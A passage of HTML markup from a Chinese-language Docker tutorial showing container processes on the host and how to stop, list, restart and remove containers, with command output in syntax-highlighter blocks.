class=\"crayon-i\">bin</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">15731</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\">               </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">                   </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\">            </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-8\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># ps -ef |grep -i 15702</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-9\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15690</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-10\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15729</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-11\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15730</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-12\"><span class=\"crayon-i\">bin</span><span class=\"crayon-h\">      </span><span class=\"crayon-cn\">15731</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">DFOREGROUND</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf38f927333707-13\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">15993</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15957</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">59</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pts</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">00</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">color</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">auto</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15702</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf38f927333707-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0055 seconds] -->\r\n<p>在第一个输出中，列出了容器产生的进程的列表。它包含了所有细节，包括用户号uid、进程号pid，父进程号ppid、开始时间、命令，等等。这里所有的进程号你都可以在宿主的进程表里搜索到。这就是我们在第二个命令里做得。这证明了容器确实是宿主系统中的进程。</p>\n<h3 id=\"toc_5\">如何停止 Docker 容器？</h3>\n<p>只需要 <code>stop</code> 命令！同样，它采用容器名称或 ID 作为参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf393036087406\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container stop cranky_cori\r\ncranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf393036087406-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf393036087406-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf393036087406-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf393036087406-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container stop cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf393036087406-2\"><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf393036087406-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_6\">如何列出停止的或不活动的 Docker 容器？</h3>\n<p>现在我们停止了我们的容器，这时如果我们使用 <code>ls</code> 命令，它将不会出现在列表中。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf397460245586\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf397460245586-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf397460245586-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf397460245586-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf397460245586-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf397460245586-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND             </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-i\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf397460245586-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>所以，在这种情况下，如果想要查看停止的或不活动的容器，你需要在 <code>ls</code> 命令里同时使用 <code>-a</code> 参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf39a608829865\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                     PORTS               NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   33 minutes ago      Exited (0) 2 minutes ago                       cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf39a608829865-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf39a608829865-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf39a608829865-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf39a608829865-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf39a608829865-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf39a608829865-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS                     </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf39a608829865-3\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">33</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-e\">Exited</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago                       </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf39a608829865-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>有了 <code>-a</code> 参数，现在我们可以查看已停止的容器。注意这些容器的状态被标注为 已退出exited。既然容器只是一个进程，那么用“退出”比“停止”更合适！</p>\n<h3 id=\"toc_7\">如何（重新）启动 Docker 容器？</h3>\n<p>现在，我们来启动这个已停止的容器。这和运行一个容器有所区别。当你运行一个容器时，你将启动一个全新的容器。当你启动一个容器时，你将开始一个已经停止并保存了当时运行状态的容器。它将以停止时的状态重新开始运行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf39e677243408\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks #  docker container start c46f2e9e4690\r\nc46f2e9e4690\r\n\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   35 minutes ago      Up 8 seconds        0.0.0.0:80-&gt;80/tcp   cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf39e677243408-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf39e677243408-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf39e677243408-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf39e677243408-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf39e677243408-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf39e677243408-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf39e677243408-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf39e677243408-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\">#  docker container start c46f2e9e4690</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf39e677243408-2\"><span class=\"crayon-e\">c46f2e9e4690</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf39e677243408-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf39e677243408-4\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf39e677243408-5\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS                </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf39e677243408-6\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">35</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-i\">Up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">seconds</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tcp   </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf39e677243408-7\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">如何移除 Docker 容器？</h3>\n<p>我们使用 <code>rm</code> 命令来移除容器。你不可以移除运行中的容器。移除之前需要先停止容器。你可以使用 <code>-f</code> 参数搭配 <code>rm</code> 命令来强制移除容器，但并不推荐这么做。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a46bf3a2987423267\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container rm cranky_cori\r\ncranky_cori\r\nroot@kerneltalks # docker container ls -a\r\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf3a2987423267-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf3a2987423267-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf3a2987423267-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a46bf3a2987423267-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a46bf3a2987423267-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf3a2987423267-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container rm cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf3a2987423267-2\"><span class=\"crayon-e\">cranky_cori</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf3a2987423267-3\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls -a</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a46bf3a2987423267-4\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND             </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS               </span><span class=\"crayon-i\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a46bf3a2987423267-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>你看，一旦移除了容器，即使再使用 <code>ls -a</code> 命令也查看不到容器了。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span 